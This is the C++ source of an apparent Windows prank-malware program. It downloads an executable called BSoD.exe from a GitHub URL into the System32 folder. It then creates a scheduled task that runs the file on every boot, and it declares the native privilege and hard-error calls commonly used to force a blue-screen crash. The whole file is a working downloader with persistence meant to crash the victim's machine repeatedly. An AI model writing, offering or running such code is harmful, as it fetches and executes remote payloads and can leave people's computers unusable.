#include <iostream>
#include <Windows.h>
#include <ntstatus.h>
#include <tchar.h>
#include <Urlmon.h>
#include <iomanip>
#include <wininet.h>
#include <fstream>

#pragma comment (lib,"urlmon.lib")

using namespace std;

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

// function definitions
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
	NTSTATUS error_status,
	ULONG number_of_parameters,
	ULONG unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG response_option,
	PULONG reponse);

int main()
{
	SetConsoleTitle(TEXT("Waiting..."));
	HWND console = GetConsoleWindow();
	RECT ConsoleRect;
	GetWindowRect(console, &ConsoleRect);
	MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 500, 200, TRUE);
	cout << "Waiting...\n";
	Sleep(1200);

	string BSoD = "C:\\Windows\\System32\\BSoD.exe";
	if (fstream{ BSoD }) {
		SetConsoleTitle(TEXT("Blue Screen of Death"));
		system("echo You die! Bye!");
		Sleep(1200);
		system("start C:\\Windows\\System32\\BSoD.exe");
	}
	else {
		SetConsoleTitle(TEXT("Downloading..."));
		const TCHAR url[] = _T("https://github.com/lecuong04/Storage/raw/main/BSoD.exe");
		const TCHAR filePath[] = _T("C:\\Windows\\System32\\BSoD.exe");
		system("cls");
		cout << ("Downloading: ") << url << endl;
		cout << ("To local file: ") << filePath << endl;
		HRESULT hr = URLDownloadToFile(
			NULL,
			url,
			filePath,
			0,
			NULL);
		if (SUCCEEDED(hr))
		{
			system("cls");
			cout << ("Downloaded OK") << endl;
			SetConsoleTitle(TEXT("Creating task..."));
			system("SCHTASKS /Create /SC ONSTART /TN BSoD /F /TR C:\\Windows\\System32\\BSoD.exe >>nul");
			Sleep(1200);
		}
		else
		{
			SetConsoleTitle(TEXT("Error!"));
			system("cls");
			cout << ("An error occured : error code = 0x") << hex << hr << endl;
			Sleep(1200);
		}
	}
}